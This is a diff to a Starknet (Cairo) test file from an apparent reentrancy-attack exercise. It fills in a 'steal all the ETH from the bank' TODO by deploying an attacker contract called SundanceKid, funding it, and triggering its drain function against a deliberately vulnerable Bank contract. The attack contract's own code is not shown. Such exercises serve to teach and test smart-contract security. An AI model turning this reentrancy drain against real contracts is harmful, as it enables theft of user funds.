@@ -5,6 +5,7 @@ use snforge_std::{
     start_cheat_caller_address, stop_cheat_caller_address,
 };
 use reentrancy_attacks::bank_attack::eth_bank::{IBankDispatcher, IBankDispatcherTrait};
+use reentrancy_attacks::bank_attack::sundance_kid::{ISundanceKidDispatcher, ISundanceKidDispatcherTrait};
 use reentrancy_attacks::utils::helpers::{
     deploy_eth, mint_erc20, one_ether,
 };
@@ -13,18 +14,34 @@ use reentrancy_attacks::utils::helpers::{
 fn deploy_bank(currency: ContractAddress) -> (ContractAddress, IBankDispatcher) {
     // Declaring the contract class
     let contract_class = declare("Bank").unwrap().contract_class();
-    // Creating the data to send to the constructor, first specifying as a default value
-    let mut data_to_constructor = Default::default();
-    // Pack the data into the constructor
-    Serde::serialize(@currency, ref data_to_constructor);
     // Deploying the contract, and getting the address
-    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
+    let (address, _) = contract_class.deploy(@array![currency.into()]).unwrap();
     (address, IBankDispatcher { contract_address: address })
 }
 
+// Helper function to deploy the robber contract
+fn deploy_the_kid(
+    attacker: ContractAddress, 
+    bank: ContractAddress,
+    eth: IERC20Dispatcher
+) -> (ContractAddress, ISundanceKidDispatcher) 
+    {
+    // Declaring the contract class
+    let contract_class = declare("SundanceKid").unwrap().contract_class();
+    let mut data = array![];
+    Serde::serialize(@attacker, ref data);
+    Serde::serialize(@bank, ref data);
+    Serde::serialize(@eth, ref data);
+    // Deploying the contract, and getting the address
+    let (address, _) = contract_class.deploy(@data).unwrap();
+    (address, ISundanceKidDispatcher { contract_address: address })
+}
+
+
+
 
 #[test]
-fn test_reentrancy_1() {
+fn test_bank_attack() {
     // Creating the addresses of Alice, Bob, and Attacker
     let alice: ContractAddress = 1.try_into().unwrap();
     let bob: ContractAddress = 2.try_into().unwrap();
@@ -59,8 +76,29 @@ fn test_reentrancy_1() {
     let bank_balance = eth_dispatcher.balance_of(bank_address);
     assert_eq!(bank_balance, 30 * one_ether());
 
+    
+    // Steal all the ETH from the bank
     // Attack Start //
-    // TODO: Steal all the ETH from the bank
+
+    // Deploy malicious contract >:|
+    let (kid_address, kid_dispatcher) = deploy_the_kid(attacker, bank_address, eth_dispatcher);
+    println!("Kid address: {:?}", kid_address);
+    // Transfer attacker ETH to kid
+    start_cheat_caller_address(eth_address, attacker);
+    eth_dispatcher.transfer(kid_address, one_ether());
+    stop_cheat_caller_address(eth_address);
+    
+    let kid_balance = eth_dispatcher.balance_of(kid_address);
+    println!("The Sundance Kid balance is: {}", kid_balance);
+
+    let bank_balance_before_attack = eth_dispatcher.balance_of(bank_address);
+    println!("Bank balance before attack: {}", bank_balance_before_attack);
+
+    // Attacc
+    start_cheat_caller_address(kid_address, attacker);
+    kid_dispatcher.put_your_hands_up();
+    stop_cheat_caller_address(kid_address);
+
 
     // Attack END //
 
